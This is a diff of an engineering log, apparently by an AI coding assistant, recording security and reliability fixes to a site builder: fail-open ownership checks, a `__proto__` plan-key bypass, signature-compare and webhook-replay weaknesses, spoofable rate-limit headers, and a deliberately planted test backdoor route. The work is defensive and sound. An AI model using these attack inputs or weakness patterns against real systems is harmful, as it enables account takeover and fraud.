@@ -9434,3 +9434,1288 @@ run.
 
 Lesson worth keeping: adding a test file is not the same as adding coverage. Check which workflow
 will execute it — a path filter or a narrow `node --test <one file>` will silently skip it.
+
+### 2026-07-28 — the lint was reporting a defect the API does not produce
+
+Went looking for what was actually wrong rather than adding tests to things already known to pass,
+and the place to look was where two files independently encode one rule. The access rules were
+written out in **three** places and two were wrong:
+
+| | reads on `feed` / `admin` |
+|---|---|
+| `site-data.mjs` (the API) | **allowed** |
+| `lintPages` | claimed "returns 403" |
+| `GENERATOR.md` | claimed 403 |
+
+So a page reading a `feed` or `admin` table got a **factually false** problem reported against it,
+which goes straight into the repair prompt — sending the model to fix something that was never
+broken and burning a paid retry. The module's own comment claimed "every rule here is checked
+against the schema, so a hit is always a real defect". That was untrue.
+
+`MANAGED_COLUMNS` was duplicated between the same two files with no guard at all: add a managed
+column to the API and the generator would keep telling the model it is writable.
+
+**Fixed structurally, not with a test.** `site-access.mjs` is a dependency-free leaf module holding
+`canReadAccess` / `canWriteAccess` / `isManagedColumn` / `MANAGED_COLUMNS`; the API that *enforces*
+the rules and the lint that *predicts* them both import it, so they cannot disagree. It had to be a
+new leaf rather than importing `site-data.mjs`, because `page-gen.mjs` must stay dependency-free —
+the `site-build` workflow runs its test without a root `npm ci`, so pulling in the Postgres driver
+would break it.
+
+The lint is now precise per level: `collect` read flagged, `user` read and write flagged (and it
+says why), `feed`/`admin` read **not** flagged, `feed`/`admin` write flagged.
+
+A test now walks every access level and asserts the lint's verdict equals the API's, so this drift
+fails CI instead of shipping a lie into a repair prompt.
+
+**Still untested, and where I would look next:** `buildAndPublishPages` in `worker.js` — the
+repair-keeping decision ("keep the retry only if it is better"), the placeholder-fallback choice,
+and the credit accounting. It is not importable, so testing it means extracting it the way
+`page-gen.mjs` was. That is where a silent bug costs real money.
+
+### …done, same day — `builder/publish-pages.mjs`
+
+Extracted exactly that, on the pattern `site-data.mjs` already uses: `publishPages(deps, {spec, slug})`
+takes `generate` / `compile` / `publish` / `readCredits` / `useCredits` as functions, so the decisions
+run against fakes with **no model call, no container, no R2, no Neon**. `worker.js` keeps the model
+call and the wiring and lost 58 lines.
+
+**23 tests**, and I mutation-checked all of them rather than trusting green — broke the module nine
+ways (keep any compiling retry · keep an equal retry · `buildMs` last-writer · no credit floor ·
+publish before checking the build · credits can be zero · skip the lint · charge only once · ledger
+failure fails open) and confirmed each one turns the suite red. Two got through the first pass and
+both were the TEST's fault, not the module's:
+
+- the harness recorded calls in its *default* `generate`, so every test that supplied its own stopped
+  counting — five assertions were passing against zero calls
+- the fake compiler returned an identical dist every time, so "kept the first attempt" and "kept the
+  retry" were literally indistinguishable. It now stamps the attempt number, which is what makes
+  `<` vs `<=` on the repair rule detectable at all
+
+Two behaviours changed on purpose while it moved:
+
+- **`buildMs` now sums both attempts.** It was last-writer, so a build that compiled twice reported
+  only the second and understated what you actually waited for.
+- **`stage` and `error` are returned**, not just logged. A failed build is now debuggable from the
+  response instead of only from `wrangler tail`.
+
+The credit floor **fails closed**: if the ledger can't be read, no paid call happens. That means a
+Supabase hiccup costs you a placeholder — deliberate, and the cheaper of the two mistakes.
+
+`site-build` now runs this test alongside `page-gen`'s (both modules are dependency-free, so still no
+install). Unit suite: **98 tests**.
+
+## 2026-07-28 — "is it actually making a live site?" — yes, and it can't be used
+
+You asked the right question. Everything that existed proved a site was **published**, not that one
+was **alive**: the smoke test fetched the HTML, checked it had `id="root"` and a script tag, and
+grepped the bundle for a table name. **No JavaScript was ever executed.** A site that mounts to a
+blank page, or whose every data call 403s, passed all of it.
+
+So I built one for real on production (`/s/barber-shop/`, 10 credits, **38.8s** — the 68.9s in the
+earlier smoke run was a cold container, not a regression) and drove it in a real Chromium against the
+real API.
+
+**It is a real site.** React mounts, nothing throws, no console errors, and it reads the Neon
+Postgres provisioned for it seconds earlier (`GET /api/db/barber-shop/rows/services?order=price&dir=asc
+→ 200`). shadcn is real — the Service dropdown is Radix under shadcn's `SelectTrigger`, classes
+verbatim new-york. TanStack Router (hash routing, code-split route chunk) and Query are both in the
+bundle, plus zod, sonner and Tailwind. The generator's field names (`customer_name`, `customer_email`,
+`appointment_date`, `appointment_time`) match the declared columns exactly. The empty list says
+"Nothing listed yet." instead of rendering a blank grid, which is what GENERATOR.md demands.
+
+### The finding: every generated site is a brochure with a dead form
+
+The Services list is empty and **will stay empty forever**. `services` is a `display` table, and
+writes to `display` are 403 for every caller **including the owner**:
+
+```
+POST /api/db/barber-shop/rows/services   (owner's own JWT)
+→ 403 {"error":"that table is not writable here","access":"display"}
+```
+
+No owner-write route survived the 2026-07-27 runtime deletion, and nothing replaced it. And it is
+worse than a missing menu: the booking form's **required** Service field is a Select fed by that empty
+table, so it renders "Choose one" with **zero options** — meaning **no visitor can book anything**.
+The form is dead on arrival. Two of my browser assertions failed on exactly this.
+
+This is a platform gap, not a generator bug. The generator did the right thing with the schema it was
+given; the `collect` table accepts writes and returns proper actionable errors
+(`{"error":"customer email is required","code":"required","field":"customer_email"}`). What is missing
+is a way to get content in. **This is the single thing between "it builds sites" and "it builds
+usable sites."** Now written into GENERATOR.md's "Not available yet" as the first item.
+
+### What landed
+
+A browser stage in `build-smoke.mjs`, so this can never again be assumed: the app mounted, nothing
+threw, no console errors, real content rendered, the page read its own Postgres, every read was 200,
+no 403s, shadcn controls (not hand-rolled), Radix live, Tailwind applied, a form with real controls,
+and the empty state. Screenshot uploaded as a CI artifact on every run, pass or fail.
+
+**Deliberately NOT asserted: submitting the form.** It is the most valuable check of the lot and it
+cannot pass today, for the reason above — not for any reason in the code under test. It is commented
+in place with the measurement and the date. **Turn it on in the same change that adds seeding.**
+
+Two corrections to my own run, both my fault not the site's: I asserted shadcn via `data-slot`, which
+this shadcn version only stamps on 2 of its 46 components (fixed to check Radix wiring + the new-york
+class signature), and my hand-written `bookings` POST used the wrong column names.
+
+Also worth knowing: **Chromium cannot reach the internet from the dev container** — the egress proxy
+resets browser CONNECTs (node's fetch is fine). The live drive was done by reverse-proxying production
+to localhost. That is why `site-runtime.mjs` serves from localhost too.
+
+**Still up for you to click:** `https://isibi.ai/s/barber-shop/` and the throwaway account that owns
+it. Say the word and both go.
+
+## 2026-07-28 (later) — fixed it: sites now launch with content
+
+"So what" was the right response to the last entry. A finding nobody acts on is worth nothing, so:
+
+**The schema designer now writes the starter content.** `seed` is a REQUIRED field on the
+`design_schema` tool — 3-6 realistic rows per `display` table, written for that specific business —
+and `seedSiteRows` (`site-schema.mjs`) inserts them straight after the tables are created. A barber
+shop now launches with its actual services listed and its booking form usable, instead of "Nothing
+listed yet." and a dropdown with nothing in it.
+
+Rules it enforces, each one mutation-tested:
+
+- **`display` only.** Seeding a `collect` table would put fabricated customers in your booking list,
+  and the API refuses to read those back anyway.
+- **Only tables that are empty**, checked per table. This is what makes a revise safe — a revise
+  re-runs the whole build, and duplicating the menu every time would be worse than never seeding.
+  Per table rather than once, because a revise can add a NEW display table to a site whose existing
+  one already has content you would not want touched.
+- **Undeclared and managed columns are dropped**, same as a real write through the data API.
+- **One bad row does not take the other eleven with it.** A site with 3 of 4 services is alive; a
+  site with none is the failure the whole thing exists to prevent.
+- Capped at 12 rows, values always bound parameters, table names through `sqlIdent`.
+- Non-fatal end to end: the database is already live when this runs, so nothing here can turn a
+  build that worked into a build that failed.
+
+The response now carries `seeded: {table: count}`, so an empty menu is visible from outside instead
+of looking like a successful build.
+
+### And the smoke test's disabled check is now on
+
+The form-submission assertion I switched off an hour ago — "it cannot pass, and not for a reason in
+the code under test" — is enabled, along with a new one that fails if any `display` table came back
+unseeded. That was the point of leaving it commented with the reason rather than deleting it.
+
+### Two real bugs found on the way in
+
+Both stale two-argument calls left over from D1, both silent:
+
+1. **`site-schema.mjs`** called `loadSiteSchema(env, uuid)` where `env` does not exist in that scope.
+   It threw a ReferenceError into a bare `catch {}` on **every single apply**, so the merge below it
+   never ran — meaning a revise that re-emitted only its changed table **stripped every other table
+   from `_meta.schema`**, and the data API then 404'd tables whose rows were still sitting in
+   Postgres. Precisely the failure the comment above it claims to prevent.
+2. **`worker.js:2150`** had the same `loadSiteSchema(env, u)` call.
+
+Unit suite: **113 tests**.
+
+## 2026-07-28 (later still) — "have you tested every backend endpoint?"
+
+No — and the honest number was **5 of 42**. Only `/api/site/react-build`, `DELETE /api/site/<slug>`,
+`/api/db/*`, `/api/credits` and `/s/<slug>` had any coverage at all.
+
+But the useful question underneath it turned out to be narrower. I measured the auth posture rather
+than guessing: **40 of 41 `/api` routes gate on `authUser`**, and the one that doesn't —
+`/api/stripe/webhook` — can't, because Stripe cannot hold a Supabase session. It authenticates by
+HMAC. So the exposure was never "37 open endpoints"; it was three specific things, now all closed.
+
+(I got this wrong once on the way. My first scan reported 6 ungated routes. That was a bug in the
+scan — it took each route's block as "everything until the next route match", which collapses to zero
+lines wherever two routes share a dispatch line, e.g. `=== "/api/video" ? … : === "/api/image"`. Fixed
+window, re-ran, corrected it in the same breath. The committed test uses the fixed window and says why.)
+
+### 1. The auth claim is now enforced, not asserted
+
+CLAUDE.md has said "all `/api/*` require a Supabase-authenticated user" for months. It was never true
+*by construction* — there is no blanket gate, only the 404 fallthrough, so every route gates itself
+and a new one added without `authUser` would be world-open with nothing to notice.
+`test/api-auth.test.mjs` reads worker.js and fails if any route outside a **two-entry allow-list**
+lacks a gate. Same fix as `site-access.mjs`: stop asserting, start measuring. The smoke test also
+probes 14 GET routes live against the deployed Worker.
+
+### 2. The webhook signature check is out of worker.js and tested
+
+`stripe-webhook.mjs`, **30 tests**, every one mutation-checked. The ones that matter: a signature over
+a *different body* is refused (capture a real webhook, swap in your own user id — the obvious attack);
+a captured signature *re-stamped* with a fresh `t` is refused (the timestamp is inside what's signed,
+so the staleness window can't be bypassed); a replay past ±300s is refused, and so is a *future*-dated
+one; either secret works mid-rotation; an empty secret fails **closed**.
+
+I also proved the constant-time compare's length XOR earns its keep: remove it and `"abc"` compares
+equal to `"abcdef"`, because `charCodeAt` past the end is NaN and `NaN ^ x` coerces to 0. That is a
+forgery primitive sitting in one line of arithmetic.
+
+`mintFromEvent` carries the money guards, each of which is free credits if it goes: subscription-mode
+sessions don't mint (their invoice does — crediting both double-grants month one), unpaid sessions
+don't, **$0 and fully-discounted invoices don't** (otherwise a coupon buys a month of credits), and
+credits come only from metadata we set at checkout — never from the amount charged.
+
+### 3. Checkout and refunds, plus a real bug
+
+`billing.mjs`, **24 tests**, mutation-checked.
+
+**The bug:** `PLANS[String(body.plan)]` with `{"plan":"__proto__"}` returns `Object.prototype`, which
+is **truthy** — so it passed the "unknown plan" guard and sent Stripe `unit_amount: "undefined"`.
+`"constructor"` and `"toString"` do the same. It fails closed at Stripe today (502), so nobody got
+free credits, but it is a caller-controlled key reaching straight into an object lookup. Now
+`Object.hasOwn` plus a string/number type check.
+
+**The one I'd most fear:** a membership's metadata must sit under `subscription_data[metadata]`, not
+the session's own `metadata`. Only the former rides onto renewal invoices. Put it in the wrong place
+and month one credits fine, then every renewal arrives with no user to credit — the customer keeps
+paying and silently stops receiving anything, and nothing logs an error. There is now a test that
+fails if those two are ever swapped, in either direction.
+
+Also pinned: top-ups must stay dearer per credit than membership (they're ~1.40¢ vs ~1.25¢); every
+plan's credit count must land on the storage tier its name promises; a refund is never issued for a
+job still running or one whose result came back 2xx or 5xx.
+
+Unit suite: **170 tests**, up from 113.
+
+### Still untested, and worth saying plainly
+
+The generation routes (`/api/video|image|audio`), `/api/direct`, `/api/save`, `/api/gallery`, the
+game-builder routes and the whole `/api/social/*` surface have no tests beyond "they refuse an
+anonymous caller". They're gated and they're not the money path, but they are not covered.
+
+## 2026-07-28 — "does it connect well to Postgres?" — correctly, but slowly. Fixed.
+
+Checked rather than assumed, and the answer had two halves.
+
+**Correctness: good.** The six seeded services come back with the right prices and durations, and
+`created_at` is in the `YYYY-MM-DD HH:MM:SS` TEXT format the app parses — confirming the
+`to_char(now() AT TIME ZONE 'UTC', …)` default works, which is the thing that would have silently
+broken when we moved off SQLite. Supabase advisors show **no ERROR-level findings**. One that looked
+alarming — `site_analytics` executable by `anon` — I called unauthenticated for a site I don't own
+and it returns `{ok:false}`; it guards internally. The money RPCs (`add_credits`, `credit_back`,
+`set_plan`) correctly do NOT appear as `authenticated`-executable. 1 Neon project, 1 site, **0 orphans**.
+
+**Speed: not good, and now fixed.** A single row read was **~0.9s median** (0.61–2.31s) for six rows.
+The driver was innocent — it is already the HTTP `neon()` client, one round trip per query, cached
+per connection string. The cost was that every read did **four sequential round trips**:
+
+1. Supabase → `site_backends` by slug (get `neon_db` + `uid`)
+2. Supabase → `user_site_project` by uid (get the connection string)
+3. Neon → `SELECT v FROM _meta WHERE k='schema'`
+4. Neon → the actual query
+
+Three of the four answer the same thing every time, and nothing cached any of them. A visit that
+renders one list and submits a form paid ~8 round trips, 6 of them pure lookup.
+
+`ttl-cache.mjs` fixes it. The connection resolution caches 5 minutes (a slug's database is immutable
+for the life of the site); the schema caches 15 seconds. `memoize` makes concurrent misses share one
+in-flight lookup — without it a cold isolate rendering three lists fires three identical resolutions
+before the first returns, which is exactly when the cache is needed most.
+
+The correctness traps, all tested:
+
+- **Never cache null.** A slug that does not resolve is usually one whose build is still finishing;
+  remembering the miss would keep a brand-new site broken for the whole TTL.
+- **Invalidate on delete, BEFORE teardown.** A cached string pointing at a dropped database answers
+  reads with a connection error instead of an honest 404.
+- **15s on the schema, not 5 minutes.** `applySiteSchema` clears it, but only in the isolate that ran
+  the build — every other PoP heals by expiry, so a revise has to settle within a refresh rather than
+  after a minute of the site 404ing its own new tables.
+- **Bounded**, so walking slugs cannot grow an isolate's memory; LRU rather than oldest-set.
+- **A failed lookup does not wedge the key** — a rejected promise left in the in-flight map would
+  make that slug fail forever.
+
+One bug caught while writing it: `ttlMs: "100"` passed a `> 0` check, and then `now() + "100"`
+CONCATENATES — `1000 + "100"` is `"1000100"`, an expiry about a thousand years out. The entry would
+never expire and it would have looked like a caching win. Now type-checked.
+
+Unit suite: **185 tests**. All 8 cache mutations turn it red.
+
+### Still not covered
+
+Generation routes, `/api/direct`, `/api/save`, `/api/gallery`, game-builder, all of `/api/social/*` —
+nothing beyond "they refuse an anonymous caller". Also open and minor, from the advisors:
+leaked-password protection is off in Auth, `citext` sits in `public`, ~30 RLS policies call
+`auth.<fn>()` per row instead of `(select auth.<fn>())`, and four `site_*` foreign keys are unindexed.
+
+## 2026-07-28 — the Neon path: user builds → project → database → connects
+
+You asked about this specific path, so I went through it line by line. It works, and it had **three
+bugs**, one of which I had introduced an hour earlier.
+
+**The expensive one.** Both Supabase writes were `await`ed and their results never looked at:
+
+```js
+const made = await createUserProject(env, uid);
+await fetch(`${SUPABASE_URL}/rest/v1/user_site_project`, {...});   // result never checked
+```
+
+A Neon project is a **capped, billed resource whose only record is that row**. If the write failed —
+a 503, a network blip — the project existed and nothing pointed at it. The user's next build found no
+row, created **another** project, and the orphan billed forever. That is almost certainly how the two
+loose projects in the old handoff notes got there. Now it is record-it-or-destroy-it: a failed write
+deletes the project it just made and fails the build with the stage that broke.
+
+Same for `site_backends`. If that write failed the database existed but nothing recorded it — the slug
+stayed unclaimed and every read 404'd, while the response still said `ok: true` with a URL. It now
+fails, because reporting a successful build for a site nobody can reach is worse than failing.
+
+**My own regression.** `ensureSiteBackend` starts by asking "does this slug already have a database?"
+— and an hour earlier I had made that lookup 5-minute-cached. On the request path that is the whole
+point; on the **write** path it means an isolate could hand back a connection for a slug another
+isolate had deleted, and the schema apply would go at a dropped database. It now uses an uncached
+read. A build takes tens of seconds, so one uncached lookup there costs nothing worth having.
+
+**Third:** a failed cleanup no longer masks the original failure — you get "could not record the Neon
+project", not "neon delete failed".
+
+All of it is now in `site-provision.mjs` with injected deps, so the ordering and every failure path is
+testable with no Neon project and no Supabase. **15 tests, all 9 mutations caught** — including the
+important one: delete the "destroy the unrecorded project" line and three tests go red.
+
+Also confirmed correct and left alone: one project per USER not per site, created lazily on first
+build; `"already exists"` is the one recoverable database error (a retried build hits the database it
+made last time, and the schema apply is additive); `connForDatabase` swaps only the path, because
+every database in a project shares one host and role.
+
+Unit suite: **200 tests**.
+
+## 2026-07-28 — "what does Supabase have to do with this?"
+
+Nothing that it should, and the question caught me proposing the wrong fix.
+
+I had measured the caching after deploying it and told you honestly it did not work: median went
+from ~0.9s to **1.05s**. The distribution showed why — three of twelve reads came back at 0.27–0.48s
+(cache hits) and the rest at ~1.05s (misses). Cloudflare evicts idle isolates, so a low-traffic site
+is almost never warm. The cache helps a page load that makes several reads; it does nothing for the
+first read, which is the one a visitor actually waits on.
+
+My proposed fix was a Supabase RPC to merge the two lookups into one round trip. Your question is the
+right one: **why is Supabase in this path at all?** It is the app's auth and user store. It was being
+used as a per-request routing table for public traffic, answering "which Neon database is this slug"
+with two cross-region HTTPS calls — for a value written once at build time that never changes again.
+Merging 2 round trips into 1 optimises a call that should not happen. KV makes it 0.
+
+So: `site-routing.mjs`. KV holds `route:<slug>` → connection string, written at build, read at the
+edge. Supabase stays the source of truth — a miss falls back and backfills — so an empty or unbound
+namespace is **slow, never wrong**, and a KV outage degrades instead of taking the sites down.
+
+**Only the connection string goes in KV, on purpose.** KV is eventually consistent; a write can take
+up to a minute to reach every colo. That is harmless for a value fixed at build time and would be a
+real bug for the schema — a revise adds tables, and a stale schema would 404 the site's own new
+tables for that whole window. The schema keeps its 15s in-isolate cache and its `_meta` read.
+
+The orderings that matter, all tested: the route is dropped **before** the database (a route
+outliving its database gives a connection error instead of an honest 404); absence is never cached (a
+slug that does not resolve is usually a build still finishing, and a KV entry written with no TTL
+never expires); an empty-string value counts as a miss, not a connection string; and a failed route
+write never fails a build that already succeeded.
+
+**You need to do one thing:** run the `create kv namespace` workflow from the Actions tab and give me
+the id it prints, so I can add the binding to `wrangler.jsonc`. I cannot create it — that needs the
+Cloudflare token, which lives in Actions secrets. Until the binding exists `env.SITE_ROUTES` is
+undefined and everything runs exactly as it does today, which is why this was safe to merge first.
+
+15 tests. Unit suite **215**.
+
+## 2026-07-28 — walking every outcome of the site builder
+
+Went through every branch the build route can take. Two real bugs, one of them the most serious thing
+found all day.
+
+### 1. The ownership check failed OPEN — a cross-account write
+
+```js
+try {
+  const g = await fetch(`.../site_backends?slug=eq.${slug}&select=uid`);
+  const rows = await g.json().catch(() => []);
+  if (rows[0] && rows[0].uid !== bu.id) return 409;
+} catch {}                      // ← swallowed
+```
+
+One Supabase timeout, or any non-200 from that call, turned **"I cannot tell who owns this slug"**
+into **"nobody does"**. The build then carried on, and `ensureSiteBackend` handed back the CURRENT
+owner's connection string — so the schema apply, the seeded rows and the published pages all landed on
+**another user's database and their R2 prefix**. A public site taken over by name, triggered by a
+network blip.
+
+Fixed in two places, because the consequence is a cross-account write:
+
+- the route's own check now **fails closed** (503 "couldn't check that name just now") instead of
+  swallowing
+- **ownership moved into the layer that returns the connection.** `lookupSite` now returns
+  `{conn, uid}` and `ensureSiteBackend` refuses a slug owned by someone else — including one that is
+  claimed but has no connection recorded yet, which is a half-finished build by another user and
+  would otherwise have let `saveBackend`'s upsert overwrite their ownership row. Same user with the
+  same half-finished state still completes, so a retried build is not locked out of its own slug.
+
+### 2. A revise gutted the site
+
+A revise sends `{slug, instruction}`, and the instruction alone is all the schema designer sees. So
+`spec` came back holding **only the tables that instruction mentioned** — "add a gallery" produced a
+one-table spec — and the page generator then rewrote the entire site knowing only that. A working
+barber shop would come back as a page listing a gallery and nothing else.
+
+The database was fine: `applySiteSchema` merges into `_meta`, so a revise cannot drop a table. (That
+merge only started working this morning — it was throwing a ReferenceError into a bare catch on every
+apply. Turns out it mattered more than I thought.) The pages were the casualty.
+
+Now the merged schema is read back after the apply and the pages are generated against **everything
+the site has**. The remaining limitation, stated plainly: the original brief is not stored anywhere,
+so a revise still only has the instruction as prose context. The schema is the important half — the
+generator writes pages from it — but "add a gallery" is a thinner prompt than the first build got.
+**Storing the brief on `site_backends` would fix that properly.**
+
+### Checked and fine
+
+`SITE_BUILD_FEE` is 2 and `credit_back` caps at 10, so the refund path works. Credits are charged
+before the design call and refunded on both failure paths. The 501s for missing config come before any
+spend. Seeding is non-fatal. The placeholder only publishes when nothing is live at that slug, so a
+failed revise leaves a working site alone.
+
+3 mutations, all caught. Unit suite **220**.
+
+## 2026-07-28 — members can now edit and delete their own rows
+
+The handlers had been written the whole time and refused at the door, because "which rows may this
+member touch" was undecided. With `owner_id` now stamped from a verified session, it is answerable.
+
+The answer is the only safe one: **a member may touch the rows they own, and nothing else.** That
+mattered more than it sounds — the existing handlers scoped by `id` ALONE, and ids are sequential
+integers. Enabling them unchanged would have let one member edit another's row by guessing a number.
+
+`collect` and `display` rows have no owner at all, so they stay refused — a `collect` row is another
+visitor's submission and a `display` row is site content.
+
+**Someone else's row answers 404, not 403.** A 403 confirms the row exists and belongs to another
+member, which over sequential ids is a way to count a site's membership. There is a test asserting
+the body says nothing about ownership, on both verbs — one of them saying the quiet part is enough.
+That test initially covered only DELETE, and the mutation against PATCH survived; caught and fixed.
+
+A `trash` table soft-deletes, still owner-scoped, so a member's mistake is recoverable.
+
+The generator learned it too: `useUpdateRow`/`useDeleteRow` used to be flagged as always-wrong. Now
+they are flagged only without `useMember()`, or when the schema has no member table to own anything.
+
+### A correction from the screenshot
+
+I told you the saved-recipe card rendered its fields in the wrong order and was worth a look. It was
+not — my browser harness filled five inputs by cycling a three-item array, so the INPUT was scrambled
+and the page displayed it faithfully. Checked field by field: every one matches what was typed into
+it. Nothing to fix, and I should not have flagged it without checking first.
+
+Unit suite **309**, site-build integration 18/18.
+
+## 2026-07-28 — the owner can finally read their own bookings
+
+The oldest gap in the builder, open since the day it started taking submissions. `collect` is
+write-only BY DESIGN — one visitor must never read back another's — but nothing distinguished "a
+visitor" from "the person the bookings are for", so nobody could read them, including the barber.
+
+`site-owner.mjs` is a SECOND door onto the same Neon database:
+
+```
+GET /api/site/<slug>/rows            what tables exist, and how many rows are waiting in each
+GET /api/site/<slug>/rows/<table>    the rows
+```
+
+Authenticated by the owner's **isibi** session, not a site session. Different caller, different door,
+same data — and it reads `collect` tables, because they are the owner's data.
+
+The gates, each mutation-tested:
+
+- **404, not 403, for a site that is not yours.** The slug space is public and guessable; a 403
+  confirms which names are taken, and by extension which businesses are customers.
+- **Ownership fails CLOSED** — 503 if the record cannot be read. The build route made exactly this
+  mistake with `catch {}` this morning, and one Supabase timeout handed a site to a stranger.
+- The table name is allow-listed against the site's own declared schema, because it reaches SQL.
+- `order` allow-listed against declared columns; limit clamped to 200; `_fts` stripped.
+- Newest first by default — these are submissions, and the useful one is the latest.
+
+One uncountable table does not lose the listing: a schema row can outlive its table if an apply
+half-succeeded, and the owner still wants to see everything else.
+
+### And edit/delete proved live
+
+Alice and Bob, two real accounts on recipe-club, against the deployed Worker. Bob attacked Alice's
+row directly by id: **404 on both PATCH and DELETE, no hint whose it is, and Alice's row intact with
+her own edit still on it.** 10/10.
+
+Unit suite **323**.
+
+---
+
+## 2026-07-28 — the throttle, and a revise that remembers what the site is
+
+Two small things, both of which a real user hits before anything else on the backlog.
+
+### `rateLimit` is finally read
+
+The schema engine has parsed a per-table `rateLimit` and a per-app `rateLimits {read, write}` since
+the day it was written, stored them in `_meta`, and **nothing had ever looked at either**. `/api/db`
+is public and unauthenticated by design — a visitor filling in a booking form has no account — and
+as of this week it also carries signup and login.
+
+`rate-limit.mjs`, wired into `site-data.mjs` (public data) and the auth branch of `worker.js`.
+Defaults 300 reads/min and 60 writes/min; a table's own `rateLimit` is a WRITE limit and wins.
+
+Three decisions worth writing down:
+
+- **Reads share one bucket per site; writes get one per table.** A read budget exists to protect
+  Neon compute, so a page with five lists should not therefore get five times the allowance. A
+  write budget exists to make a declared per-table limit mean something — a table capped at 5/min
+  must not be sharing those 5 with the contact form.
+- **`CF-Connecting-IP` only.** The obvious `|| X-Forwarded-For` fallback (which the rest of
+  worker.js uses) would have defeated the whole thing: it is a request header like any other, so a
+  caller who varies it mints a fresh bucket per request. Cloudflare sets CF-Connecting-IP itself.
+  No header at all → everyone shares the "unknown" bucket, which is the safe direction to fail.
+- **The throttle runs before the visitor is resolved**, which is a database read of its own. A
+  flood should pay for none of what follows.
+
+**And it fixed a live bug.** `authThrottle` counted with `ttl-cache`, whose `set` re-stamps the
+expiry — so the window was *extended by every blocked attempt* and a locked-out address never got a
+fresh one as long as anyone kept trying. One bad minute on a shared office IP was an indefinite
+lockout. `makeLimiter` fixes `resetAt` at the first hit and never moves it.
+
+Honest about the ceiling: this is per-isolate. Cloudflare runs many isolates per colo, so a
+distributed flood still walks through. It stops the single-source case, which is the one that
+actually happens, and it costs one map lookup. A real limiter needs Durable Objects.
+
+### A revise now knows what the site was for
+
+A revise sends `{slug, instruction}`, so the generator's entire knowledge of the site was one line
+like "add a gallery" — and since it rewrites every page each time, a working barber shop came back
+as a page listing a gallery and nothing else. The merged schema fixed the *tables* last week; the
+*intent* was still missing, and it was the open item in the notes.
+
+`site_backends.brief` now holds the brief the site was built from. It costs nothing to read — the
+route already does that lookup for the ownership check — and it is written exactly once per site,
+because `ensureSiteBackend` returns early when the slug already has a database. So a revise
+physically cannot overwrite it.
+
+`briefForPages()` composes the two: original brief as the anchor, instruction as the change, plus
+"keep everything the original asked for unless this change says otherwise" — the failure mode is
+subtraction, not addition. Deliberately **not** an accumulating log: that grows without bound and
+keeps contradicting itself ("remove the gallery" stays true forever). What the site has *become* is
+carried by the merged schema, which is the authoritative half anyway.
+
+Unit suite **362** (+39). Every new test mutation-checked: 26/26 on the limiter, 11/11 on the
+wiring, 8/8 on the brief.
+
+---
+
+## 2026-07-28 — the owner's data panel, both halves
+
+Went looking for what to do next and found the answer rather than guessing: **`public/chat.js` had a
+fully-built site management panel calling eight routes that no longer exist**, all deleted in the
+2026-07-27 runtime removal and never re-pointed. The Data tab is a real rendered tab next to
+Preview/Code/More, it fires on open, and every call in it 404'd — table list, row list, add/edit/
+delete form. The Submissions and Members modals too.
+
+And the mirror image: `GET /api/site/<slug>/rows`, built yesterday so a barber shop could finally
+see its bookings, **had no caller.** Two halves of the same hole.
+
+### Owner writes
+
+`POST`/`PATCH`/`DELETE /api/site/<slug>/rows/<table>[/<id>]`. This closes the last item GENERATOR.md
+listed under *not available yet*: nothing could write a `display` table after the build — not a
+visitor, not the owner, there was no route — so a café could not correct a price without rebuilding
+the entire site. That is also the whole reason build-time seeding had to exist.
+
+The calls worth writing down:
+
+- **PATCH/DELETE work on every declared table.** The owner owns all of it, and they can already read
+  every row through this door; editing a member's post is moderation, not impersonation.
+- **POST is refused on `user`/`feed` with a 409.** Those rows belong to a member, and the owner has
+  no id in that database's `_users` — the row would carry `owner_id` NULL: invisible to every `user`
+  read (which scopes to the caller's own id) and unattributable in a feed. Refused rather than
+  silently creating an orphan.
+- **Managed columns are dropped even when the table DECLARES one.** An `ordered`/`trash`/`version`
+  table carries `position`/`deleted_at`/`_version` in its stored column list, so "it was declared"
+  is not enough — setting one by hand desynchronises the row from its own ordering, soft-delete and
+  optimistic-lock state. A mutation test caught that my first version was only safe by accident.
+- **A row id that is not a positive integer is 400.** It is a bound parameter, so this was never
+  injection — it is a Postgres type error surfacing as a 500 when the honest answer is "no such row".
+
+### `_users`, and why it needs its own route
+
+Members are reachable only through `/api/site/<slug>/members`. `_users` is deliberately not part of
+the declared schema, and that is exactly what puts it out of reach of every other route here — no
+password hash is readable or writable through the table door. The members route is the one place
+that names it, and it **names its columns explicitly**: a `SELECT *` would ship `pass_hash` the
+moment anyone adds a column.
+
+Deleting a member leaves their rows alone. `owner_id` stops matching anyone, but a deleted customer's
+bookings should not silently vanish from the owner's list.
+
+### One hazard found on the way
+
+The site-delete route matched **any** DELETE under `/api/site/` and stripped the path down to a slug,
+so `/api/site/cafe/rows/bookings/4` would have arrived as the slug `caferowsx4`. Harmless only by
+luck, and directly in the path of every row delete. Tightened to a bare slug, and the matcher
+precedence is now checked explicitly.
+
+### Still dead, and honestly so
+
+Re-pointed: the Data tab, the Submissions modal, the Members modal. **Not re-pointed, because there
+is no backend for them at all:** the Database modal's backups / export / metrics cards, and
+`/api/site/analytics`, `/api/site/scan`, `/api/site/publish`, `/api/site/unpublish`,
+`/api/site/preview`. Analytics is the interesting one — `worker.js` writes `site_hits` on every
+visit and nothing reads it.
+
+Unit suite **386**. 25/25 mutations caught on the owner door (one of which, the managed-column
+filter, was genuinely untested until it flagged).
+
+### Live run found two things the unit tests could not
+
+Ran the owner door against the deployed Worker and the real `sharp-fade-barbershop` database.
+**21/23 first pass**, and both failures were worth having.
+
+1. **Adding a row answered 500.** The public write path has mapped duplicate / overlap / bad_ref /
+   row-cap / required / invalid to usable messages for a while; the owner's path was written without
+   it, so leaving out a required column produced "Something went wrong" — the owner cannot tell
+   which field they missed, and retries the identical request. Now `site-errors.mjs`, one shared
+   leaf module both paths call, with a test that reads the source and fails if either keeps its own
+   copy. A missing field now comes back as **"price is required"** with the column named, so a form
+   can point at it.
+2. **My test asserted the wrong contract.** A non-numeric row id does not match the route regex at
+   all, so it is a 404 at the router, not the handler's 400. `rowIdOf` still matters — it covers
+   numeric-but-invalid ids (`0`, out of range) which DO reach the handler and would otherwise be a
+   Postgres type error surfacing as a 500. Corrected the test rather than the code.
+
+Everything else passed on the first live run, including the two that matter most: the owner reads
+`bookings` while the **public API still 403s the same table**, and editing a `display` row really
+changes the database.
+
+### And a hole in the auth invariant
+
+While waiting on the deploy I wedged a fake ungated `/api/backdoor` into `worker.js` to check that
+`test/api-auth.test.mjs` would catch it. **It did not.** The scanner treated any two route dispatches
+within 3 lines as one decision — a rule that exists only for the `/api/video|image|audio` ternary —
+so an ungated route written directly above a gated one inherited its gate. That is the dangerous
